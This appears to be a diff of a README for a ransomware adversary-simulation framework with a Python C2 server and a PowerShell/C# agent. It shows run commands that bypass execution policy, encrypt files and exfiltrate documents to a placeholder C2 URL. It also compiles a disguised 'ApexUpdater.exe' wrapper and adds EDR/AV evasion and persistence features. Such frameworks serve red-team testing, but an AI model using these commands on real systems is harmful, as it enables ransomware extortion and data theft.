@@ -29,10 +29,13 @@ The use of this framework for attacking targets without prior mutual consent is 
 * [x] AES-256-CBC Per-File Encryption
 * [x] Asynchronous Python C2 Backend (Quart/aiosqlite)
 * [x] Automated Metadata Exfiltration (TLS 1.2+)
-* [x] **Data Theft Module (T1041):** Automated discovery and exfiltration
+* [x] Data Theft Module (T1041): Automated discovery and exfiltration
 * [x] Persistence & Lateral Propagation Modules
 * [x] Canary Tripwire Real-time Alerts
-* [ ] Advanced EDR Evasion (In Progress)
+* [x] Basic Reporting: Forensic PDF report
+* [x] Basic EDR/AV Evasion
+* [ ] Advanced Reporting: Forensic and IR PDF mapped to MITRE ATT&CK (In Progress)
+* [ ] Advanced EDR/AV Evasion (In Progress)
 
 ---
 
@@ -47,8 +50,6 @@ The central hub for persistent victim tracking and telemetry analysis.
 * **Forensic Reporting:** Automated professional PDF generation via `apex_report.py`.
 * **Secure Comms:** Metadata manifests tunneled through encrypted HTTPS.
 
-
-
 ### 💻 The Apex Agent (PowerShell/C#)
 
 The primary execution module designed for high-fidelity impact simulation.
@@ -57,8 +58,6 @@ The primary execution module designed for high-fidelity impact simulation.
 * **Impact:** Wallpaper hijacking, ransom notes, and UI defacement (T1491).
 * **Data Theft (T1041):** Discovery and exfiltration of `.xlsx`, `.pdf`, and `.docx` via Base64 streams.
 * **Stealth:** C# wrapper option to execute PowerShell in-memory to bypass static analysis.
-
-
 
 ---
 
@@ -82,17 +81,18 @@ sudo python3 c2_server.py
 
 ### 2. Client Preparation & Execution
 
-Generate victim data and launch the simulation phase.
+Generate victim data and launch the simulation phase. To ensure execution on restricted systems, use the `-ExecutionPolicy Bypass` flag.
 
 ```powershell
 # [B] Lab Preparation: Generate dummy data
-.\GenerateVictimData.ps1 -RootPath "C:\SimulationData"
+# Usage: .\GenerateVictimData.ps1 -RootPath <Path>
+powershell.exe -ExecutionPolicy Bypass -File .\GenerateVictimData.ps1 -RootPath "C:\SimulationData"
 
 # [C] Execution Phase 1: Impact (Theft, Encryption & Exfiltration)
-.\ApexSim.ps1 -Mode Encrypt -C2Url "https://<YOUR_C2_IP>/api/v1/telemetry" -TargetPath "C:\SimulationData"
+powershell.exe -ExecutionPolicy Bypass -File .\ApexSim.ps1 -Mode Encrypt -C2Url "https://<YOUR_C2_IP>/api/v1/telemetry" -TargetPath "C:\SimulationData"
 
 # [C] Execution Phase 2: Recovery (Decryption)
-.\ApexSim.ps1 -Mode Decrypt -TargetPath "C:\SimulationData"
+powershell.exe -ExecutionPolicy Bypass -File .\ApexSim.ps1 -Mode Decrypt -TargetPath "C:\SimulationData"
 
 ```
 
@@ -116,6 +116,16 @@ base64 -w 0 ApexSim.ps1 > b64_script.txt
 
 ```powershell
 csc.exe /target:winexe /reference:System.Management.Automation.dll /out:ApexUpdater.exe ApexRunner.cs
+
+```
+
+### 4. Post-Simulation Reporting
+
+After the simulation is complete, generate the forensic evidence report from the C2 database.
+
+```bash
+# Ensure the C2 server has populated apex_vault.db
+python3 apex_report.py
 
 ```
 
